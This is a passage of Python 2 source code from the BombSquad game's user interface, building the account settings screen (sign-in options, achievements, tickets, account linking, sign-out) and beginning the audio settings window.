    def _getSignInText(self):
        return bs.Lstr(resource=self._r+'.signInText')

    def _refresh(self):

        import bsCoopGame

        env = bs.getEnvironment()

        accountState = bsInternal._getAccountState()
        accountType = bsInternal._getAccountType(
        ) if accountState == 'SIGNED_IN' else 'unknown'

        isGoogle = True if accountType == 'Google Play' else False

        showLocalSignedInAs = False
        localSignedInAsSpace = 50

        showSignedInAs = True if self._signedIn else False
        signedInAsSpace = 95

        showSignInBenefits = True if not self._signedIn else False
        signInBenefitsSpace = 80

        showSigningInText = True if accountState == 'SIGNING_IN' else False
        signingInTextSpace = 80

        showGooglePlaySignInButton = True if (
            accountState == 'SIGNED_OUT'
            and 'Google Play' in self._showSignInButtons) else False
        showGameCircleSignInButton = True if (
            accountState == 'SIGNED_OUT'
            and 'Game Circle' in self._showSignInButtons) else False
        showAliSignInButton = True if (
            accountState == 'SIGNED_OUT'
            and 'Ali' in self._showSignInButtons) else False
        showTestSignInButton = True if (
            accountState == 'SIGNED_OUT'
            and 'Test' in self._showSignInButtons) else False
        showDeviceSignInButton = True if (
            accountState == 'SIGNED_OUT'
            and 'Local' in self._showSignInButtons) else False
        signInButtonSpace = 70

        showGameServiceButton = (
            True if (self._signedIn and accountType
                     in ['Game Center', 'Game Circle']) else False)
        gameServiceButtonSpace = 60

        showLinkedAccountsText = (
            True if self._signedIn
            and bsInternal._getAccountMiscReadVal('allowAccountLinking2', False)
            else False)
        linkedAccountsTextSpace = 60

        showAchievementsButton = True if (self._signedIn and accountType in (
            'Google Play', 'Alibaba', 'Local', 'OUYA', 'Test')) else False
        achievementsButtonSpace = 60

        showAchievementsText = True if (
            self._signedIn and not showAchievementsButton) else False
        achievementsTextSpace = 27

        showLeaderboardsButton = True if (
            self._signedIn and isGoogle) else False
        leaderboardsButtonSpace = 60

        showCampaignProgress = True if self._signedIn else False
        campaignProgressSpace = 27

        showTickets = True if self._signedIn else False
        ticketsSpace = 27

        showResetProgressButton = False
        resetProgressButtonSpace = 70

        showPlayerProfilesButton = True if self._signedIn else False
        playerProfilesButtonSpace = 100

        showLinkAccountsButton = (
            True if self._signedIn
            and bsInternal._getAccountMiscReadVal(
                'allowAccountLinking2', False) else False)
        linkAccountsButtonSpace = 70

        showUnlinkAccountsButton = True if showLinkAccountsButton else False
        unlinkAccountsButtonSpace = 90

        showSignOutButton = True if (self._signedIn and accountType in [
                                     'Test', 'Local', 'Google Play']) else False
        signOutButtonSpace = 70

        if self._subContainer is not None:
            self._subContainer.delete()
        self._subHeight = 60
        if showLocalSignedInAs:
            self._subHeight += localSignedInAsSpace
        if showSignedInAs:
            self._subHeight += signedInAsSpace
        if showSigningInText:
            self._subHeight += signingInTextSpace
        if showGooglePlaySignInButton:
            self._subHeight += signInButtonSpace
        if showGameCircleSignInButton:
            self._subHeight += signInButtonSpace
        if showAliSignInButton:
            self._subHeight += signInButtonSpace
        if showTestSignInButton:
            self._subHeight += signInButtonSpace
        if showDeviceSignInButton:
            self._subHeight += signInButtonSpace
        if showGameServiceButton:
            self._subHeight += gameServiceButtonSpace
        if showLinkedAccountsText:
            self._subHeight += linkedAccountsTextSpace
        if showAchievementsText:
            self._subHeight += achievementsTextSpace
        if showAchievementsButton:
            self._subHeight += achievementsButtonSpace
        if showLeaderboardsButton:
            self._subHeight += leaderboardsButtonSpace
        if showCampaignProgress:
            self._subHeight += campaignProgressSpace
        if showTickets:
            self._subHeight += ticketsSpace
        if showSignInBenefits:
            self._subHeight += signInBenefitsSpace
        if showResetProgressButton:
            self._subHeight += resetProgressButtonSpace
        if showPlayerProfilesButton:
            self._subHeight += playerProfilesButtonSpace
        if showLinkAccountsButton:
            self._subHeight += linkAccountsButtonSpace
        if showUnlinkAccountsButton:
            self._subHeight += unlinkAccountsButtonSpace
        if showSignOutButton:
            self._subHeight += signOutButtonSpace
        self._subContainer = c = bs.containerWidget(
            parent=self._scrollWidget, size=(self._subWidth, self._subHeight),
            background=False)
        bs.containerWidget(
            edit=self._scrollWidget, claimsLeftRight=True, claimsTab=True,
            selectionLoopToParent=True)
        bs.containerWidget(
            edit=self._subContainer, claimsLeftRight=True, claimsTab=True,
            selectionLoopToParent=True)

        firstSelectable = None

        v = self._subHeight - 10

        if showLocalSignedInAs:
            v -= localSignedInAsSpace * 0.6
            t = bs.textWidget(
                parent=self._subContainer, position=(self._subWidth * 0.5, v),
                size=(0, 0),
                text=bs.Lstr(
                    resource='accountSettingsWindow.deviceSpecificAccountText',
                    subs=[('${NAME}', bsInternal._getAccountDisplayString())]),
                scale=0.7, color=(0.5, 0.5, 0.6),
                maxWidth=self._subWidth * 0.9, flatness=1.0, hAlign="center",
                vAlign="center")
            v -= localSignedInAsSpace * 0.4

        if showSignedInAs:
            v -= signedInAsSpace*0.2

            txt = bs.Lstr(
                resource='accountSettingsWindow.youAreSignedInAsText',
                fallbackResource='accountSettingsWindow.youAreLoggedInAsText')
            t = bs.textWidget(
                parent=self._subContainer, position=(self._subWidth * 0.5, v),
                size=(0, 0),
                text=txt, scale=0.9, color=gTitleColor, maxWidth=self._subWidth
                * 0.9, hAlign="center", vAlign="center")

            v -= signedInAsSpace*0.4

            self._accountNameText = bs.textWidget(
                parent=self._subContainer, position=(self._subWidth * 0.5, v),
                size=(0, 0),
                scale=1.5, maxWidth=self._subWidth * 0.9, resScale=1.5,
                color=(1, 1, 1, 1),
                hAlign="center", vAlign="center")
            self._refreshAccountNameText()
            v -= signedInAsSpace*0.4
        else:
            self._accountNameText = None

        if self._backButton is None:
            bb = bsInternal._getSpecialWidget('backButton')
        else:
            bb = self._backButton

        if showSignInBenefits:
            v -= signInBenefitsSpace
            env = bs.getEnvironment()
            if (env['platform'] in ['mac', 'ios']
                    and env['subplatform'] == 'appstore'):
                extra = bs.Lstr(
                    value='\n${S}', subs=[
                        ('${S}', bs.Lstr(resource='signInWithGameCenterText'))])
            else:
                extra = ''

            t = bs.textWidget(
                parent=self._subContainer,
                position=(self._subWidth * 0.5, v + signInBenefitsSpace * 0.4),
                size=(0, 0),
                text=bs.Lstr(
                    value='${A}${B}',
                    subs=[('${A}', bs.Lstr(
                        resource=self._r + '.signInInfoText')),
                        ('${B}', extra)]),
                maxHeight=signInBenefitsSpace * 0.9, scale=0.9,
                color=(0.75, 0.7, 0.8),
                maxWidth=self._subWidth * 0.8, hAlign="center", vAlign="center")

        if showSigningInText:
            v -= signingInTextSpace

            t = bs.textWidget(
                parent=self._subContainer,
                position=(self._subWidth * 0.5, v + signingInTextSpace * 0.5),
                size=(0, 0),
                text=bs.Lstr(
                    resource='accountSettingsWindow.signingInText'),
                scale=0.9, color=(0, 1, 0),
                maxWidth=self._subWidth * 0.8, hAlign="center", vAlign="center")

        if showGooglePlaySignInButton:
            buttonWidth = 350
            v -= signInButtonSpace
            self._signInGooglePlayButton = b = bs.buttonWidget(
                parent=self._subContainer,
                position=((self._subWidth - buttonWidth) * 0.5, v - 20),
                autoSelect=True, size=(buttonWidth, 60),
                label=bs.Lstr(
                    value='${A}${B}',
                    subs=[('${A}', bs.getSpecialChar('googlePlusLogo')),
                          ('${B}', bs.Lstr(
                              resource=self._r
                              + '.signInWithGooglePlayText'))]),
                onActivateCall=lambda: self._signInPress('Google Play'))
            if firstSelectable is None:
                firstSelectable = b
            if gToolbars:
                bs.widget(
                    edit=b, rightWidget=bsInternal._getSpecialWidget(
                        'partyButton'))
            bs.widget(edit=b, leftWidget=bb)
            bs.widget(edit=b, showBufferBottom=40, showBufferTop=100)
            self._signInText = None

        if showGameCircleSignInButton:
            buttonWidth = 350
            v -= signInButtonSpace
            self._signInGameCircleButton = b = bs.buttonWidget(
                parent=self._subContainer,
                position=((self._subWidth - buttonWidth) * 0.5, v - 20),
                autoSelect=True, size=(buttonWidth, 60),
                label=bs.Lstr(
                    value='${A}${B}',
                    subs=[('${A}', bs.getSpecialChar('gameCircleLogo')),
                          ('${B}', bs.Lstr(
                              resource=self._r
                              + '.signInWithGameCircleText'))]),
                onActivateCall=lambda: self._signInPress('Game Circle'))
            if firstSelectable is None:
                firstSelectable = b
            if gToolbars:
                bs.widget(
                    edit=b, rightWidget=bsInternal._getSpecialWidget(
                        'partyButton'))
            bs.widget(edit=b, leftWidget=bb)
            bs.widget(edit=b, showBufferBottom=40, showBufferTop=100)
            self._signInText = None

        if showAliSignInButton:
            buttonWidth = 350
            v -= signInButtonSpace
            self._signInAliButton = b = bs.buttonWidget(
                parent=self._subContainer,
                position=((self._subWidth - buttonWidth) * 0.5, v - 20),
                autoSelect=True, size=(buttonWidth, 60),
                label=bs.Lstr(
                    value='${A}${B}',
                    subs=[('${A}', bs.getSpecialChar('alibabaLogo')),
                          ('${B}', bs.Lstr(
                              resource=self._r + '.signInText'))]),
                onActivateCall=lambda: self._signInPress('Ali'))
            if firstSelectable is None:
                firstSelectable = b
            if gToolbars:
                bs.widget(
                    edit=b, rightWidget=bsInternal._getSpecialWidget(
                        'partyButton'))
            bs.widget(edit=b, leftWidget=bb)
            bs.widget(edit=b, showBufferBottom=40, showBufferTop=100)
            self._signInText = None

        if showDeviceSignInButton:
            buttonWidth = 350
            v -= signInButtonSpace
            self._signInDeviceButton = b = bs.buttonWidget(
                parent=self._subContainer,
                position=((self._subWidth - buttonWidth) * 0.5, v - 20),
                autoSelect=True, size=(buttonWidth, 60),
                label='', onActivateCall=lambda: self._signInPress('Local'))
            bs.textWidget(
                parent=self._subContainer, drawController=b, hAlign='center',
                vAlign='center', size=(0, 0),
                position=(self._subWidth * 0.5, v + 17),
                text=bs.Lstr(
                    value='${A}${B}',
                    subs=[('${A}', bs.getSpecialChar('localAccount')),
                          ('${B}', bs.Lstr(
                              resource=self._r + '.signInWithDeviceText'))]),
                maxWidth=buttonWidth * 0.8, color=(0.75, 1.0, 0.7))
            bs.textWidget(
                parent=self._subContainer, drawController=b, hAlign='center',
                vAlign='center', size=(0, 0),
                position=(self._subWidth * 0.5, v - 4),
                text=bs.Lstr(
                    resource=self._r + '.signInWithDeviceInfoText'),
                flatness=1.0, scale=0.57, maxWidth=buttonWidth * 0.9,
                color=(0.55, 0.8, 0.5))
            if firstSelectable is None:
                firstSelectable = b
            if gToolbars:
                bs.widget(
                    edit=b, rightWidget=bsInternal._getSpecialWidget(
                        'partyButton'))
            bs.widget(edit=b, leftWidget=bb)
            bs.widget(edit=b, showBufferBottom=40, showBufferTop=100)
            self._signInText = None

        # old test-account option..
        if showTestSignInButton:
            buttonWidth = 350
            v -= signInButtonSpace
            self._signInTestButton = b = bs.buttonWidget(
                parent=self._subContainer,
                position=((self._subWidth - buttonWidth) * 0.5, v - 20),
                autoSelect=True, size=(buttonWidth, 60),
                label='', onActivateCall=lambda: self._signInPress('Test'))
            bs.textWidget(parent=self._subContainer, drawController=b,
                          hAlign='center', vAlign='center', size=(0, 0),
                          position=(self._subWidth * 0.5, v + 17),
                          text=bs.Lstr(
                              value='${A}${B}',
                              subs=[('${A}', bs.getSpecialChar('testAccount')),
                                    ('${B}', bs.Lstr(
                                        resource=self._r +
                                        '.signInWithTestAccountText'))]),
                          maxWidth=buttonWidth * 0.8, color=(0.75, 1.0, 0.7))
            bs.textWidget(
                parent=self._subContainer, drawController=b, hAlign='center',
                vAlign='center', size=(0, 0),
                position=(self._subWidth * 0.5, v - 4),
                text=bs.Lstr(
                    resource=self._r + '.signInWithTestAccountInfoText'),
                flatness=1.0, scale=0.57, maxWidth=buttonWidth * 0.9,
                color=(0.55, 0.8, 0.5))
            if firstSelectable is None:
                firstSelectable = b
            if gToolbars:
                bs.widget(
                    edit=b, rightWidget=bsInternal._getSpecialWidget(
                        'partyButton'))
            bs.widget(edit=b, leftWidget=bb)
            bs.widget(edit=b, showBufferBottom=40, showBufferTop=100)
            self._signInText = None

        if showPlayerProfilesButton:
            buttonWidth = 300
            v -= playerProfilesButtonSpace
            self._playerProfilesButton = b = bs.buttonWidget(
                parent=self._subContainer,
                position=((self._subWidth - buttonWidth) * 0.5, v + 30),
                autoSelect=True, size=(buttonWidth, 60),
                label=bs.Lstr(resource='playerProfilesWindow.titleText'),
                color=(0.55, 0.5, 0.6),
                icon=bs.getTexture('cuteSpaz'),
                textColor=(0.75, 0.7, 0.8),
                onActivateCall=self._playerProfilesPress)
            if firstSelectable is None:
                firstSelectable = b
            if gToolbars:
                bs.widget(
                    edit=b, rightWidget=bsInternal._getSpecialWidget(
                        'partyButton'))
            bs.widget(edit=b, leftWidget=bb, showBufferBottom=0)

        # the button to go to OS-Specific leaderboards/high-score-lists/etc.
        if showGameServiceButton:
            buttonWidth = 300
            v -= gameServiceButtonSpace*0.85
            accountType = bsInternal._getAccountType()
            if accountType == 'Game Center':
                accountTypeName = bs.Lstr(resource='gameCenterText')
            elif accountType == 'Game Circle':
                accountTypeName = bs.Lstr(resource='gameCircleText')
            else:
                raise Exception("unknown account type: '"+str(accountType)+"'")
            self._gameServiceButton = b = bs.buttonWidget(
                parent=self._subContainer,
                position=((self._subWidth - buttonWidth) * 0.5, v),
                color=(0.55, 0.5, 0.6),
                textColor=(0.75, 0.7, 0.8),
                autoSelect=True, onActivateCall=bsInternal._showOnlineScoreUI,
                size=(buttonWidth, 50),
                label=accountTypeName)
            if firstSelectable is None:
                firstSelectable = b
            if gToolbars:
                bs.widget(
                    edit=b, rightWidget=bsInternal._getSpecialWidget(
                        'partyButton'))
            bs.widget(edit=b, leftWidget=bb)
            v -= gameServiceButtonSpace*0.15
        else:
            self.gameServiceButton = None

        if showAchievementsText:
            v -= achievementsTextSpace*0.5
            self._achievementsText = t = bs.textWidget(
                parent=self._subContainer, position=(self._subWidth * 0.5, v),
                size=(0, 0),
                scale=0.9, color=(0.75, 0.7, 0.8),
                maxWidth=self._subWidth * 0.8, hAlign="center", vAlign="center")
            v -= achievementsTextSpace*0.5
        else:
            self._achievementsText = None

        if showAchievementsButton:
            buttonWidth = 300
            v -= achievementsButtonSpace*0.85
            self._achievementsButton = b = bs.buttonWidget(
                parent=self._subContainer,
                position=((self._subWidth - buttonWidth) * 0.5, v),
                color=(0.55, 0.5, 0.6),
                textColor=(0.75, 0.7, 0.8),
                autoSelect=True, icon=bs.getTexture(
                    'googlePlayAchievementsIcon'
                    if isGoogle else 'achievementsIcon'),
                iconColor=(0.8, 0.95, 0.7) if isGoogle else(0.85, 0.8, 0.9),
                onActivateCall=self._onAchievementsPress, size=(buttonWidth,
                                                                50),
                label='')
            if firstSelectable is None:
                firstSelectable = b
            if gToolbars:
                bs.widget(
                    edit=b, rightWidget=bsInternal._getSpecialWidget(
                        'partyButton'))
            bs.widget(edit=b, leftWidget=bb)
            v -= achievementsButtonSpace*0.15
        else:
            self._achievementsButton = None

        if showAchievementsText or showAchievementsButton:
            self._refreshAchievements()

        if showLeaderboardsButton:
            buttonWidth = 300
            v -= leaderboardsButtonSpace*0.85
            self._leaderboardsButton = b = bs.buttonWidget(
                parent=self._subContainer,
                position=((self._subWidth - buttonWidth) * 0.5, v),
                color=(0.55, 0.5, 0.6),
                textColor=(0.75, 0.7, 0.8),
                autoSelect=True, icon=bs.getTexture(
                    'googlePlayLeaderboardsIcon'),
                iconColor=(0.8, 0.95, 0.7),
                onActivateCall=self._onLeaderboardsPress, size=(buttonWidth,
                                                                50),
                label=bs.Lstr(resource='leaderboardsText'))
            if firstSelectable is None:
                firstSelectable = b
            if gToolbars:
                bs.widget(
                    edit=b, rightWidget=bsInternal._getSpecialWidget(
                        'partyButton'))
            bs.widget(edit=b, leftWidget=bb)
            v -= leaderboardsButtonSpace*0.15
        else:
            self._leaderboardsButton = None

        if showCampaignProgress:
            v -= campaignProgressSpace*0.5

            self._campaignProgressText = t = bs.textWidget(
                parent=self._subContainer, position=(self._subWidth * 0.5, v),
                size=(0, 0),
                scale=0.9, color=(0.75, 0.7, 0.8),
                maxWidth=self._subWidth * 0.8, hAlign="center", vAlign="center")
            v -= campaignProgressSpace*0.5
            self._refreshCampaignProgressText()
        else:
            self._campaignProgressText = None

        if showTickets:
            v -= ticketsSpace*0.5

            self._ticketsText = t = bs.textWidget(
                parent=self._subContainer, position=(self._subWidth * 0.5, v),
                size=(0, 0),
                scale=0.9, color=(0.75, 0.7, 0.8),
                maxWidth=self._subWidth * 0.8, flatness=1.0, hAlign="center",
                vAlign="center")
            v -= ticketsSpace*0.5
            self._refreshTicketsText()

        else:
            self._ticketsText = None

        # bit of spacing before the reset/sign-out section
        v -= 5

        buttonWidth = 250
        if showResetProgressButton:
            confirmText = (
                bs.Lstr(resource=self._r+'.resetProgressConfirmText')
                if self._canResetAchievements
                else bs.Lstr(resource=self._r
                             +'.resetProgressConfirmNoAchievementsText'))
            v -= resetProgressButtonSpace
            self._resetProgressButton = b = bs.buttonWidget(
                parent=self._subContainer,
                position=((self._subWidth - buttonWidth) * 0.5, v),
                color=(0.55, 0.5, 0.6),
                textColor=(0.75, 0.7, 0.8),
                autoSelect=True, size=(buttonWidth, 60),
                label=bs.Lstr(resource=self._r + '.resetProgressText'),
                onActivateCall=bs.Call(
                    ConfirmWindow, text=confirmText, width=500, height=200,
                    action=self._resetProgress))
            if firstSelectable is None:
                firstSelectable = b
            if gToolbars:
                bs.widget(
                    edit=b, rightWidget=bsInternal._getSpecialWidget(
                        'partyButton'))
            bs.widget(edit=b, leftWidget=bb)

        if showLinkedAccountsText:
            v -= linkedAccountsTextSpace*0.8
            self._linkedAccountsText = t = bs.textWidget(
                parent=self._subContainer, position=(self._subWidth * 0.5, v),
                size=(0, 0),
                scale=0.9, color=(0.75, 0.7, 0.8),
                maxWidth=self._subWidth * 0.95, hAlign="center",
                vAlign="center")
            v -= linkedAccountsTextSpace*0.2
            self._updateLinkedAccountsText()
        else:
            self._linkedAccountsText = None

        if showLinkAccountsButton:
            v -= linkAccountsButtonSpace
            self._linkAccountsButton = b = bs.buttonWidget(
                parent=self._subContainer,
                position=((self._subWidth - buttonWidth) * 0.5, v),
                autoSelect=True, size=(buttonWidth, 60),
                label='', color=(0.55, 0.5, 0.6),
                onActivateCall=self._linkAccountsPress)
            bs.textWidget(
                parent=self._subContainer, drawController=b, hAlign='center',
                vAlign='center', size=(0, 0),
                position=(self._subWidth * 0.5, v + 17 + 20),
                text=bs.Lstr(resource=self._r + '.linkAccountsText'),
                maxWidth=buttonWidth * 0.8, color=(0.75, 0.7, 0.8))
            bs.textWidget(
                parent=self._subContainer, drawController=b, hAlign='center',
                vAlign='center', size=(0, 0),
                position=(self._subWidth * 0.5, v - 4 + 20),
                text=bs.Lstr(resource=self._r + '.linkAccountsInfoText'),
                flatness=1.0, scale=0.5, maxWidth=buttonWidth * 0.8,
                color=(0.75, 0.7, 0.8))
            if firstSelectable is None:
                firstSelectable = b
            if gToolbars:
                bs.widget(
                    edit=b, rightWidget=bsInternal._getSpecialWidget(
                        'partyButton'))
            bs.widget(edit=b, leftWidget=bb, showBufferBottom=50)

        if showUnlinkAccountsButton:
            v -= unlinkAccountsButtonSpace
            self._unlinkAccountsButton = b = bs.buttonWidget(
                parent=self._subContainer,
                position=((self._subWidth - buttonWidth) * 0.5, v + 25),
                autoSelect=True, size=(buttonWidth, 60),
                label='', color=(0.55, 0.5, 0.6),
                onActivateCall=self._unlinkAccountsPress)
            self._unlinkAccountsButtonLabel = bs.textWidget(
                parent=self._subContainer, drawController=b, hAlign='center',
                vAlign='center', size=(0, 0),
                position=(self._subWidth * 0.5, v + 55),
                text=bs.Lstr(resource=self._r + '.unlinkAccountsText'),
                maxWidth=buttonWidth * 0.8, color=(0.75, 0.7, 0.8))
            if firstSelectable is None:
                firstSelectable = b
            if gToolbars:
                bs.widget(
                    edit=b, rightWidget=bsInternal._getSpecialWidget(
                        'partyButton'))
            bs.widget(edit=b, leftWidget=bb, showBufferBottom=50)
            self._updateUnlinkAccountsButton()
        else:
            self._unlinkAccountsButton = None

        if showSignOutButton:
            v -= signOutButtonSpace
            self._signOutButton = b = bs.buttonWidget(
                parent=self._subContainer,
                position=((self._subWidth - buttonWidth) * 0.5, v),
                size=(buttonWidth, 60),
                label=bs.Lstr(resource=self._r + '.signOutText'),
                color=(0.55, 0.5, 0.6),
                textColor=(0.75, 0.7, 0.8),
                autoSelect=True, onActivateCall=self._signOutPress)
            if firstSelectable is None:
                firstSelectable = b
            if gToolbars:
                bs.widget(
                    edit=b, rightWidget=bsInternal._getSpecialWidget(
                        'partyButton'))
            bs.widget(edit=b, leftWidget=bb, showBufferBottom=15)

        # whatever the topmost selectable thing is, we want it to scroll all
        # the way up when we select it
        if firstSelectable is not None:
            bs.widget(edit=firstSelectable, upWidget=bb, showBufferTop=400)
            # (this should re-scroll us to the top..)
            bs.containerWidget(edit=self._subContainer,
                               visibleChild=firstSelectable)

        self._needsRefresh = False

    def _onAchievementsPress(self):
        accountState = bsInternal._getAccountState()
        accountType = bsInternal._getAccountType(
        ) if accountState == 'SIGNED_IN' else 'unknown'
        # for google play we use the built-in UI; otherwise pop up our own
        if accountType == 'Google Play':
            bs.realTimer(150, bs.Call(
                bsInternal._showOnlineScoreUI, 'achievements')),
        elif accountType != 'unknown':
            AchievementsWindow(
                position=self._achievementsButton.getScreenSpaceCenter())
        else:
            print 'ERROR: unknown account type in onAchievementsPress:', \
                accountType

    def _onLeaderboardsPress(self):
        bs.realTimer(150, bs.Call(
            bsInternal._showOnlineScoreUI, 'leaderboards')),

    def _haveUnlinkableAccounts(self):
        # if this is not present, we havn't had contact from the server so
        # let's not proceed..
        if bsInternal._get_public_login_id() is None:
            return False
        accounts = bsInternal._getAccountMiscReadVal2('linkedAccounts', [])
        return True if len(accounts) > 1 else False

    def _updateUnlinkAccountsButton(self):
        if self._unlinkAccountsButton is None:
            return
        if self._haveUnlinkableAccounts():
            c = (0.75, 0.7, 0.8)
        else:
            c = (1.0, 1.0, 1.0, 0.25)
        bs.textWidget(edit=self._unlinkAccountsButtonLabel, color=c)

    def _updateLinkedAccountsText(self):
        if self._linkedAccountsText is None:
            return

        # if this is not present, we haven't had contact from the server so
        # let's not proceed..
        if bsInternal._get_public_login_id() is None:
            num = int(time.time()) % 4
            accountsStr = num * '.' + (4 - num) * ' '
        else:
            accounts = bsInternal._getAccountMiscReadVal2('linkedAccounts', [])
            # ourAccount = bsInternal._getAccountDisplayString()
            # accounts = [a for a in accounts if a != ourAccount]
            # accountsStr = u', '.join(accounts) if accounts else
            # bs.Lstr(translate=('settingNames', 'None'))
            # UPDATE - we now just print the number here; not the actual
            # accounts
            # (they can see that in the unlink section if they're curious)
            accountsStr = str(max(0, len(accounts) - 1))
        bs.textWidget(edit=self._linkedAccountsText,
                      text=bs.Lstr(value='${L} ${A}', subs=[
                          ('${L}', bs.Lstr(resource=self._r
                                           +'.linkedAccountsText')),
                          ('${A}', accountsStr)]))

    def _refreshCampaignProgressText(self):
        if self._campaignProgressText is None:
            return
        try:
            campaign = bsCoopGame.getCampaign('Default')
            levels = campaign.getLevels()
            levelsComplete = sum((1 if l.getComplete() else 0) for l in levels)
            # last level cant be completed; hence the -1
            progress = min(1.0, float(levelsComplete)/(len(levels)-1))
            pStr = bs.Lstr(
                resource=self._r + '.campaignProgressText',
                subs=[('${PROGRESS}', str(int(progress * 100.0)) + '%')])
        except Exception:
            pStr = '?'
            bs.printException('error calculating co-op campaign progress')
        bs.textWidget(edit=self._campaignProgressText, text=pStr)

    def _refreshTicketsText(self):
        if self._ticketsText is None:
            return
        try:
            tcStr = str(bsInternal._getAccountTicketCount())
        except Exception:
            bs.printException()
            tcStr = '-'
        bs.textWidget(edit=self._ticketsText, text=bs.Lstr(
            resource=self._r + '.ticketsText',
            subs=[('${COUNT}', tcStr)]))

    def _refreshAccountNameText(self):
        if self._accountNameText is None:
            return
        try:
            nameStr = bsInternal._getAccountDisplayString()
        except Exception:
            bs.printException()
            nameStr = u'??'
        bs.textWidget(edit=self._accountNameText, text=nameStr)

    def _refreshAchievements(self):
        import bsAchievement
        if self._achievementsText is None and self._achievementsButton is None:
            return
        complete = sum(1
                       if a.isComplete() else 0
                       for a in bsAchievement.gAchievements)
        total = len(bsAchievement.gAchievements)
        txtFinal = bs.Lstr(
            resource=self._r + '.achievementProgressText',
            subs=[('${COUNT}', str(complete)),
                  ('${TOTAL}', str(total))])

        if self._achievementsText is not None:
            bs.textWidget(edit=self._achievementsText, text=txtFinal)
        if self._achievementsButton is not None:
            bs.buttonWidget(edit=self._achievementsButton, label=txtFinal)

    def _linkAccountsPress(self):
        import bsUI2
        bsUI2.LinkAccountsWindow(originWidget=self._linkAccountsButton)

    def _unlinkAccountsPress(self):
        if not self._haveUnlinkableAccounts():
            bs.playSound(bs.getSound('error'))
            return
        import bsUI2
        bsUI2.UnlinkAccountsWindow(originWidget=self._unlinkAccountsButton)

    def _playerProfilesPress(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition="outLeft")
        PlayerProfilesWindow(originWidget=self._playerProfilesButton)

    def _signOutPress(self):
        bsInternal._signOut()

        bsConfig = bs.getConfig()

        # take note that its our explit intention to not be signed in at this
        # xpoint...
        bsConfig['Auto Account State'] = 'SIGNED_OUT'

        bs.writeConfig()
        bs.buttonWidget(edit=self._signOutButton,
                        label=bs.Lstr(resource=self._r+'.signingOutText'))

    def _signInPress(self, accountType, showTestWarning=True):
        bsInternal._signIn(accountType)
        # make note of the type account we're *wanting* to be signed in with..
        bs.getConfig()['Auto Account State'] = accountType
        bs.writeConfig()
        self._needsRefresh = True
        bs.realTimer(100, bs.WeakCall(self._update))

    def _resetProgress(self):
        try:
            import bsCoopGame
            # FIXME - this would need to happen server-side these days
            if self._canResetAchievements:
                bs.getConfig()['Achievements'] = {}
                bsInternal._resetAchievements()
            campaign = bsCoopGame.getCampaign('Default')
            campaign.reset()  # also writes the config..
            campaign = bsCoopGame.getCampaign('Challenges')
            campaign.reset()  # also writes the config..
        except Exception:
            bs.printException('exception resetting co-op campaign progress')

        bs.playSound(bs.getSound('shieldDown'))
        self._refresh()

    def _back(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget,
                           transition=self._transitionOut)

        if not self._modal:
            uiGlobals['mainMenuWindow'] = MainMenuWindow(
                transition='inLeft').getRootWidget()

    def _save_state(self):
        try:
            sel = self._rootWidget.getSelectedChild()
            if sel == self._backButton:
                selName = 'Back'
            elif sel == self._scrollWidget:
                selName = 'Scroll'
            else:
                raise Exception("unrecognized selection")
            gWindowStates[self.__class__.__name__] = selName
        except Exception:
            bs.printException('exception saving state for', self.__class__)

    def _restore_state(self):
        try:
            try:
                selName = gWindowStates[self.__class__.__name__]
            except Exception:
                selName = None
            if selName == 'Back':
                sel = self._backButton
            elif selName == 'Scroll':
                sel = self._scrollWidget
            else:
                sel = self._backButton
            bs.containerWidget(edit=self._rootWidget, selectedChild=sel)
        except Exception:
            bs.printException('error restoring state for', self.__class__)


class ConfigAudioWindow(Window):

    def __init__(self, transition='inRight', originWidget=None):

        # if they provided an origin-widget, scale up from that
        if originWidget is not None:
            self._transitionOut = 'outScale'
            scaleOrigin = originWidget.getScreenSpaceCenter()
            transition = 'inScale'
        else:
            self._transitionOut = 'outRight'
            scaleOrigin = None

        self._r = 'audioSettingsWindow'

        spacing = 50
        width = 460
        height = 210

        # update: hard-coding head-relative audio to true now, so not showing
        # options showVRHeadRelativeAudio = True if
        # bs.getEnvironment()['vrMode'] else False
        showVRHeadRelativeAudio = False

        if showVRHeadRelativeAudio:
            height += 70

        showSoundtracks = False
        if bsUtils.haveMusicPlayer():
            showSoundtracks = True
            height += spacing*2.0

        baseScale = 2.05 if gSmallUI else 1.6 if gMedUI else 1.0
        popupMenuScale = baseScale*1.2

        self._rootWidget = bs.containerWidget(
            size=(width, height),
            transition=transition, scale=baseScale,
            scaleOriginStackOffset=scaleOrigin, stackOffset=(0, -20)
            if gSmallUI else(0, 0))
        self._backButton = backButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(35, height - 55),
            size=(120, 60),
            scale=0.8, textScale=1.2, label=bs.Lstr(resource='backText'),
            buttonType='back', onActivateCall=self._back, autoSelect=True)
        bs.containerWidget(edit=self._rootWidget, cancelButton=b)
        v = height - 60
        v -= spacing*1.0
        t = bs.textWidget(
            parent=self._rootWidget, position=(width * 0.5, height - 32),
            size=(0, 0),
            text=bs.Lstr(resource=self._r + '.titleText'),
            color=gTitleColor, maxWidth=180, hAlign="center", vAlign="center")

        if gDoAndroidNav:
            bs.buttonWidget(
                edit=self._backButton, buttonType='backSmall', size=(60, 60),
                label=bs.getSpecialChar('back'))

        self._soundVolumeWidgets = sv = configTextBox(
            parent=self._rootWidget, position=(40, v),
            xOffset=10, name="Sound Volume", displayName=bs.Lstr(
                resource=self._r + '.soundVolumeText'),
            type="float", minVal=0, maxVal=1.0, increment=0.1)
        if gToolbars:
            bs.widget(
                edit=sv['plusButton'],
                rightWidget=bsInternal._getSpecialWidget('partyButton'))
        v -= spacing
        self._musicVolumeWidgets = mv = configTextBox(
            parent=self._rootWidget, position=(40, v),
            xOffset=10, name="Music Volume", displayName=bs.Lstr(
                resource=self._r + '.musicVolumeText'),
            type="float", minVal=0, maxVal=1.0, increment=0.1,
            callback=bsUtils._musicVolumeChanged, changeSound=None)

        v -= 0.5*spacing

        if showVRHeadRelativeAudio:
            v -= 40
            t = bs.textWidget(
                parent=self._rootWidget, position=(40, v + 24),
                size=(0, 0),
                text=bs.Lstr(resource=self._r + '.headRelativeVRAudioText'),
                color=(0.8, 0.8, 0.8),
                maxWidth=230, hAlign="left", vAlign="center")

            p = PopupMenu(
                parent=self._rootWidget, position=(290, v),
                width=120, buttonSize=(135, 50),
                scale=popupMenuScale, choices=['Auto', 'On', 'Off'],
                choicesDisplay=[bs.Lstr(resource='autoText'),
                                bs.Lstr(resource='onText'),
                                bs.Lstr(resource='offText')],
                currentChoice=bsInternal._getSetting('VR Head Relative Audio'),
